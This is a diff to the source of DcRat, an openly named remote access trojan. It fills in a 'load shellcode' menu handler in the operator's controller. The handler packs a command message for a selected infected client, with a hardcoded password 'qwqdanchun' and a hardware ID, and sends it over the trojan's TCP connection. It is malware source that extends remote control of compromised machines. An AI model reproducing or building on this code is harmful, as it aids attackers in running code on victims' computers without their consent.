@@ -1,6 +1,8 @@
 ﻿using DcRat.Controls;
 using DcRat.Properties;
 using DcRat.SingleForms;
+using DcRat.TCPSocket;
+using MessagePack;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -8,6 +10,7 @@ using System.Data;
 using System.Drawing;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -215,7 +218,16 @@ namespace DcRat.ChildForms
 
         private void loadShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            
+            if (listViewHome.Tag != null)
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "Controler";
+                msgpack.ForcePathObject("Client").AsString = ((ListViewItem)listViewHome.Tag).SubItems[3].Text;
+                msgpack.ForcePathObject("Type").AsString = "Command";
+                msgpack.ForcePathObject("Password").AsString = "qwqdanchun";
+                msgpack.ForcePathObject("HWID").AsString = Connection.HWID();
+                Connection.Send(msgpack.Encode2Bytes());
+            }
         }
 
         private void listViewHome_DrawItem(object sender, DrawListViewItemEventArgs e)
